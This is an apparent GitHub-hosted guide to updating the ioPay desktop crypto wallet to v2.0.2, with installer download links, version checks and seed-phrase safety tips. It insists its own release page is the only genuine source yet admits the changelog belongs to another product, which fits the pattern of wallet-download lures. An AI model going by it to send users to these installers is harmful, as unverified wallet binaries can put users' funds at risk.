![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Updating ioPay Wallet to the Current Release (v2.0.2)

**The current release is v2.0.2, published 19 November 2026.** If your app shows anything earlier, you are on an old build - and the first thing to try for most "it isn't working" problems is the update, because a large share of IoTeX wallet issues in circulation describe behaviour that the current build handles differently.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## Check which version you have

Open the app's about or version area - usually in the menu or settings - and read the version string. If it does not say **v2.0.2**, you have an update to do. The version number is also the only reliable identifier: release titles are consistent, but the number is what tells you where you are.

## Update

**Automatic.** The app supports auto-update, so in most installations it will offer or apply the current release itself. Accept it, let it finish, and reopen the app. Your accounts and phrase are not part of the installer, so an update does not touch them.

**Manual.** If auto-update is off, blocked, or the app is too old to offer it:

1. Go to the release page in the ioPay Wallet repository and take the asset for your platform:
   - Windows: `iopay-wallet-desktop-win-v2.0.2.exe`
   - macOS: `iopay-wallet-desktop-macos-v2.0.2.dmg`
   - Linux: `iopay-wallet-desktop-linux-v2.0.2.zip`
2. Install it over the existing app. On Windows run the `.exe`; on macOS replace the app in Applications; on Linux unpack over the old folder - see *the Linux notes* if you installed it manually.
3. Reopen and confirm the version.
4. If the app opens with no accounts, you have installed a *second* copy rather than updating the first, or you are on a different OS user profile. Stop and check before creating anything new - your funds are still in the original account, not lost.

## About release notes

There is no changelog to summarise. The v2.0.2 release body carries the title only, and the repository's `CHANGELOG.md` is generated from an upstream codebase and documents a different product's history. So:

- **Version claims** come from the release page.
- **Feature claims** come from what the app does on the day you use it.
- **Anything you read elsewhere** - a review site, a mirror, a summary - is not a release note, even when it looks like one.

That is why this page does not list "what's new in v2.0.2". Inventing a changelog would be worse than saying there isn't one.

What can be said without one: the problems users reported were fixed in v2.0.2. That is a statement about the release rather than an itemised list, so the version check above stays the only thing you can confirm for yourself - and it is also the reason a report against an earlier build is a report about an earlier build.

## "Did I miss an upgrade, or is my settings wrong?"

This is the single most common framing of the problem, and the answer splits cleanly:

**If the app cannot reach the chain at all** - spinning, "connecting", a timestamp or network error - that is an endpoint or network problem, not a version problem. See [ioPay Wallet not connecting to the network](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md).

**If balances or history look stale but the app connects**, that is a sync/refresh issue: [balance not updating](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-balance-not-updating.md).

**If a feature you expected is missing**, check the version first, then check you are looking at the right account - features are app-wide, but positions and balances are per-account.

**If the app will not accept your password or PIN**, that is the app lock rather than the version: [the app lock page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-password-not-working.md) covers what it protects and what it cannot reset.

**If the app updated itself and something changed**, that is the update doing its job. There is no rollback path published with the release, so if a new build breaks something for you, report it rather than hunting for an old installer from a third-party site.

## Before and after any update

- **No update ever needs your seed phrase.** If an update prompt, an email or a website asks for it, that is a phishing attempt - *how to spot fake downloads* is the page for that.
- **Confirm your backup exists** before updating, not because the update touches it, but because "I'll check the backup later" is how a recovery gap becomes permanent.
- **Do not update from a mirror.** The release page is the only documented source.

## Where to go next

- [What ioPay Wallet is](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/what-is-iopay-wallet.md) - the product, in one page.
- [Which desktop build is current](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-and-earlier-desktop-builds.md) - if you are not sure what you have installed.
- *Install on Windows* is the clean-install route, rather than an update.

## What the update leaves alone

The update replaces the application, not the wallet. Accounts, the app lock and the settings live in the data directory, so installing v2.0.2 over an older build keeps every account exactly where it was - which is also why an update is not a backup and never substitutes for one.

If the app comes back with an empty account list after an update, the likeliest explanation is not data loss: it is a second copy installed beside the first, or a different OS user profile than the one that held the accounts. Check both before doing anything drastic, and never reinstall "to fix it" while the phrase is unverified.


---

*Version, date and asset names are from the v2.0.2 release. This page makes no claim about what changed in the release, because the release does not say.*
